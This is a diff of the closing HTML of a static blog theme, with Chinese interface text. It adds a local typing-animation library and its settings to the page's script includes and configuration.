-    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.8-RC"};</script><script src="/js/theme.min.js" defer></script></body>
 </html>
